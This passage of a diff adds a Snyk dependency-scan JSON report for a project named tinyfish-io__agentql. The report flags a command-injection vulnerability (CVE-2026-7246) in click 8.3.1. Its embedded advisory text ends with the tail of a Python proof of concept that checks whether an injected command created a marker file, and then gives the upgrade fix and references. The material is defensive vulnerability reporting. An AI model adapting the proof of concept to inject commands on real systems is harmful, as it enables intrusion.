Exception as e:\n        print(f\"[!] Exception: {e}\")\n    finally:\n        if os.path.exists(malicious_filename):\n            os.remove(malicious_filename)\n\n    if os.path.exists(marker_file):\n        print(f\"[+] SUCCESS: marker file '{marker_file}' was created by the injected command.\")\n    else:\n        print(\"[-] Marker file NOT created.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n## Remediation\nUpgrade `click` to version 8.3.3 or higher.\n## References\n- [GitHub Advisory](https://github.com/tsigouris007/security-advisories/security/advisories/GHSA-47fr-3ffg-hgmw)\n- [GitHub Commit](https://github.com/pallets/click/commit/b96c2601af4e01341b4d2c0db494ebee4aef8f42)\n- [GitHub Release](https://github.com/pallets/click/releases/tag/8.3.3)\n",
+        "epssDetails": {
+          "percentile": "0.52290",
+          "probability": "0.00810",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-7246"
+          ],
+          "CWE": [
+            "CWE-78"
+          ],
+          "GHSA": [
+            "GHSA-47fr-3ffg-hgmw"
+          ]
+        },
+        "packageName": "click",
+        "proprietary": false,
+        "creationTime": "2026-05-03T06:54:01.030441Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-04-30T14:29:14.555000Z",
+        "exploitDetails": {
+          "sources": [
+            "Snyk"
+          ],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Proof of Concept",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Proof of Concept",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-05-03T06:54:01.299536Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-07-09T15:25:32.946576Z",
+        "socialTrendAlert": true,
+        "packagePopularityRank": 99,
+        "from": [
+          "tinyfish-io__agentql@0.0.0",
+          "agentql@1.17.1",
+          "typer@0.21.1",
+          "click@8.3.1"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "click",
+        "version": "8.3.1",
+        "severityWithCritical": "high"
+      }
+    ],
+    "upgrade": {},
+    "patch": {},
+    "ignore": {},
+    "pin": {
+      "click@8.3.1": {
+        "upgradeTo": "click@8.3.3",
+        "vulns": [
+          "SNYK-PYTHON-CLICK-16347201"
+        ],
+        "isTransitive": false
+      }
+    }
+  },
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "uniqueCount": 1,
+  "projectName": "tinyfish-io__agentql",
+  "displayTargetFile": "requirements.txt",
+  "hasUnknownVersions": false,
+  "path": "/work/tinyfish-io__agentql"
+}
